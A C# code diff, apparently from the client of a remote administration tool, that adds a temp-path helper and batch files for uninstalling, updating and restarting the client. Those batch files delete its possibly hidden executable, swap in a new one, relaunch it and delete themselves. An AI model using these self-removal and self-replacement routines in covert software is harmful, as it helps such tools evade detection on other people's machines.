@@ -20,6 +20,21 @@ namespace xClient.Core.Helper
             return string.Concat(randomName.ToString(), extension);
         }
 
+        /// <summary>
+        /// Creates an unused temp file path. 
+        /// </summary>
+        /// <param name="extension">The file extension with dot.</param>
+        /// <returns>The path to the temp file.</returns>
+        public static string GetTempFilePath(string extension)
+        {
+            while (true)
+            {
+                string tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
+                if (File.Exists(tempFilePath)) continue;
+                return tempFilePath;
+            }
+        }
+
         public static bool IsValidExecuteableFile(byte[] block)
         {
             if (block.Length < 2) return false;
@@ -35,18 +50,17 @@ namespace xClient.Core.Helper
         {
             try
             {
-                string batchFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    GetRandomFilename(12, ".bat"));
+                string batchFile = GetTempFilePath(".bat");
 
                 string uninstallBatch = (isFileHidden)
                     ? "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "del " + "\"" + batchFile + "\""
                     : "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "del " + "\"" + batchFile + "\""
                     ;
@@ -64,20 +78,19 @@ namespace xClient.Core.Helper
         {
             try
             {
-                string batchFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    GetRandomFilename(12, ".bat"));
+                string batchFile = GetTempFilePath(".bat");
 
                 string uninstallBatch = (isFileHidden)
                     ? "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "del " + "\"" + batchFile + "\""
                     : "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
@@ -85,6 +98,29 @@ namespace xClient.Core.Helper
                     ;
 
                 File.WriteAllText(batchFile, uninstallBatch);
+                return batchFile;
+            }
+            catch (Exception)
+            {
+                return string.Empty;
+            }
+        }
+
+        public static string CreateRestartBatch()
+        {
+            try
+            {
+                string batchFile = GetTempFilePath(".bat");
+
+                string uninstallBatch =
+                    "@echo off" + "\n" +
+                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                    "ping -n 10 localhost > nul" + "\n" +
+                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "del " + "\"" + batchFile + "\"";
+
+                File.WriteAllText(batchFile, uninstallBatch);
+
                 return batchFile;
             }
             catch (Exception)
